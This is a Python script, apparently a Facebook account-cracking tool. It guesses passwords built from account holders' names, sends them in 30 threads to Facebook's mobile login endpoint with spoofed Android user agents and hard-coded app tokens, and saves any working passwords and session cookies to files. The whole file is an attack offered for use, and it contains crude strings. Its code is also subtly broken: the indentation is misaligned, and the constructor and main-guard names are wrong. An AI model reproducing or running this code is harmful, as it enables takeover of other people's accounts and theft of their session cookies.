import requests
import sys
import uuid
import random
import os
import time
import datetime
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from rich.console import Console
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich.columns import Columns

# Warna untuk teks output
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
U = '\x1b[1;95m'
N = '\x1b[0m'
W = '\033[97m'  # Putih
R = '\033[91m'  # Merah
G = '\033[92m'  # Hijau

# Definisikan informasi dinamis
tool = "FILE v1.0"
owner = "FILE DUMP"
bit = "64-bit"
version = "1.0.0"

# Mendapatkan tanggal hari ini dalam format yang diinginkan
date = datetime.datetime.now().strftime("%Y-%m-%d")

# Logo dan format string
logo = f"""{H}
    JJ   SSSSS    OOOO    NN   NN    XX   XX  DDDD  
    JJ SS       OO    OO  NNN  NN     XX XX   DD  DD 
    JJ   SSSS   OO    OO  NN N NN      XXX    DD  DD 
JJ  JJ       SS OO    OO  NN  NNN     XX XX   DD  DD 
 JJJJ   SSSSS     OOOO    NN   NN    XX   XX  DDDD 
{P}━═━═══━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━━══━═━═━═━═━══{P}
TOOL OWNER    {M}:{P} FOUNDER X JSON
TOOL TYPE     {M}:{P} RANDOM ID CRACK {M}[{H}V1.0{M}]
TOOL STATUS   {M}:{P} \x1b[0;45mPREMIUM\x1b[0;91m{P}
YOUR KEY      {M}:{H} PRIVATE
{P}━═━═══━═━═━═━═━━═━═━══━═━═━═━═━━═━═━═━═━══━═━═━══━═━"""
def line():print(f"{P}━═━═══━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━━══━═━═━═━═━══")
# Pilih warna acak untuk output
wardom = random.choice([M, K, H, P])
import random

def fuckx():
    model = random.choice(["SM-G780G","SM-O497J","SM-L427V","SM-C297Z","SM-G507X","SM-Y634L","SM-J204F","SM-R911A","SM-X801O","SM-A792E","SM-H270F","SM-P993J","SM-V233F","SM-O861W","SM-D182C","SM-Y729G","SM-Z367Q","SM-U191O","SM-U559U","SM-B567Y","SM-O846M","SM-G342Z","SM-K531M","SM-I847H","SM-A728M","SM-L637H","SM-L429N","SM-P413J","SM-N731T","SM-R505B","SM-A744X","SM-O400L","SM-F799H","SM-Z679E"])
    bal = "[FBAN/FB4A;FBAV/"+str(random.randint(10,100))+'.0.0.'+str(random.randint(4000,5000))+";FBBV/"+str(random.randint(4000000,5000000))+f";[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/"+"{density=3.0,width=1080,height=1920}"+f";FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{model};FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
    return bal

# Kelas utama untuk melakukan cracking
class FounderClone:
    def init(self):
        self.FounderClone_file = input(f'{P} ▶ Example : {H}/sdcard/file.txt...\n{P} Input File ▶ {H} ')
        self.FounderClone_oks = 0
        self.FounderClone_cps = 0
        self.FounderClone_loop = 0
        self.FounderClone_uidlist = []

    # Fungsi untuk membersihkan file
    def FounderClone_bersihkan_file(self):
        bersih = []
        with open(self.FounderClone_file, 'r', encoding='utf-8') as f:
            for line in f:
                user = line.strip()
                if '|' in user:
                    parts = user.split('|', 1)
                    if len(parts) == 2 and parts[0] and parts[1]:
                        bersih.append(user)
        self.FounderClone_uidlist = bersih

    # Fungsi untuk memulai cracking
    def FounderClone_mulai(self):
        self.FounderClone_bersihkan_file()
        os.system("clear");print(logo);print(f"{P}▶ Total Account : {H} {len(self.FounderClone_uidlist)}");print(f"{P}▶ Method ▶ SERVER S1");line()
        with ThreadPoolExecutor(max_workers=30) as eksekutor:
            for user in self.FounderClone_uidlist:
                uid, nama = user.split('|')
                nama = nama.lower()
                depan = nama.split(' ')[0] if " " in nama else nama
                pasw = []
                if len(nama) < 6:
                    if len(depan) >= 3:
                        pasw += [nama, depan + "12", depan + "123", depan + "123", depan + "12345", depan + "123456", depan + "321", depan + "01", depan + "02", depan + "03", depan + "04", depan + "05", depan + "06", depan + "07"]
        else:
                    pasw += [nama, depan + "12", depan + "123", depan + "123", depan + "12345", depan + "123456", depan + "321", depan + "01", depan + "02", depan + "03", depan + "04", depan + "05", depan + "06", depan + "07"]
                eksekutor.submit(self._FounderClone_validate, uid, pasw)

    # Fungsi untuk validasi login
    def _FounderClone_validate(self, uid, pasw):
        ses = requests.Session()
        ua = fuckx()
        sys.stdout.write(f"\r{wardom}{uid} {P} loop : {H}{self.FounderClone_loop}{P} {P}Succes : {H}{str(self.FounderClone_oks)} {P}Failed : {K}{str(self.FounderClone_cps)}")
        sys.stdout.flush()
        for pwku in pasw:
            try:
                data = {
                    "kids_xudina": str(uuid.uuid4()),
                    "format": "json",
                    "sha_kids_bokachoda": str(uuid.uuid4()),
                    "FUCK_ARAFAT": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "email": uid,
                    "password": pwku,
                    "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                    "generate_session_cookies": "1",
                    "locale": "en_US",
                    "client_country_code": "US",
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d",
                }
                headers = {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Host": "graph.facebook.com",
                    "User-Agent": ua,
                    "X-FB-Net-HNI": "45204",
                    "X-FB-SIM-HNI": "45201",
                    "X-FB-Connection-Type": "unknown",
                    "Connection": "Keep-Alive",
                }
                url = "https://graph.facebook.com/auth/login"
                founder = ses.post(url, data=data, headers=headers, allow_redirects=False).json()
                if "access_token" in founder:
                    self.FounderClone_oks += 1
                    coki = ";".join(i["name"] + "=" + i["value"] for i in founder["session_cookies"])
                    print(f"\r{H} {uid}{P}|{H}{pwku}\n{P}{coki}\n")
                    open("/sdcard/STOKFBOLD/file-ok.txt","a").write(f"{uid}|{pwku}|{coki}\n")
                    break
                elif "User must verify their account" in founder.get("error", {}).get("message", ""):
                    self.FounderClone_cps += 1
                    print(f"\r{P} {uid}|{pwku}\n{P} {ua}\n")
                    open("/sdcard/STOKFBOLD/file-cp.txt","a").write(f"{uid}|{pwku}\n")
                    break
                else:
                    continue
            except requests.exceptions.ConnectionError:
                sleep(10)
        self.FounderClone_loop += 1

# Menjalankan program utama
if name == 'main':
    os.system('clear')
    print(logo)
    founder = FounderClone()
    founder.FounderClone_mulai()
